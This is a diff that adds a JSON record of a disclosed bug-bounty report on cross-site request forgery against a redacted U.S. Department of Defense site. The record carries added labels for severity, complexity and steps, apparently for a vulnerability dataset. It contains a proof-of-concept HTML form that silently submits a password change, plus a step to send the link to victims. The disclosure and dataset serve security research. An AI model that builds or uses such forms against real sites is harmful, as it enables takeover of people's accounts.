@@ -1,0 +1,50 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "dhakal_bibek ",
+    "title": "CSRF to account takeover in https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/",
+    "content": "\nSummary:\nHello\nDescription:\nImpact\nStep-by-step Reproduction Instructions\nGo to https://\u2588\u2588\u2588.mil/ and login using your credintials\nNow Click on change password\nFirst turn the intercept of burp to on and enter your secondary email id and password and click on register password.\nCode 517 Bytes\n1<html>\n2  <!-- CSRF PoC - kira-->\n3  <body>\n4  <script>history.pushState('', '', '/')</script>\n5    <form action=\"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/scripts/wa.exe\" method=\"POST\">\n6      <input type=\"hidden\" name=\"GETPW2\" value=\"GETPW1\" />\n7      <input type=\"hidden\" name=\"Y\" value=\"a\u2588\u2588\u2588\u2588\u2588\" />\n8      <input type=\"hidden\" name=\"p\" value=\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" />\n9      <input type=\"hidden\" name=\"q\" value=\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" />\n10      <input type=\"hidden\" name=\"X\" value=\"\" />\n11      <input type=\"submit\" value=\"Submit request\" />\n12    </form>\n13  </body>\n14</html>\n15\n4: Now send the link to the victims\n## Product, Version, and Configuration (If applicable)\n\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nIt is a critical issue as i was able to takeover anyone account using this attack..\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-Site Request Forgery (CSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1602891780,
+    "report_url": "https://hackerone.com/reports/987751",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Go to https://\u2588\u2588\u2588.mil/ and login using your credentials"
+        ],
+        [
+            2,
+            "Click on 'Change Password' and intercept the request with Burp Suite"
+        ],
+        [
+            3,
+            "Modify the intercepted request to include a secondary email and password, then forward it"
+        ],
+        [
+            4,
+            "Create a CSRF PoC HTML file with hidden form fields targeting the password change endpoint"
+        ],
+        [
+            5,
+            "Send the malicious link to victims to execute the CSRF attack"
+        ]
+    ],
+    "vuln_description": "This vulnerability is a CSRF (Cross-Site Request Forgery) attack that allows an attacker to take over any user's account by tricking them into changing their password without their knowledge. The attacker crafts a malicious HTML form that submits a password change request to the vulnerable endpoint, and when the victim visits the page while authenticated, their password is changed to one controlled by the attacker.",
+    "reason": "The attack involves understanding the password change flow, intercepting and modifying the request, and crafting a CSRF payload. However, these steps are straightforward for someone familiar with web security testing tools like Burp Suite. The vulnerability does not require complex application state manipulation or novel logic.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
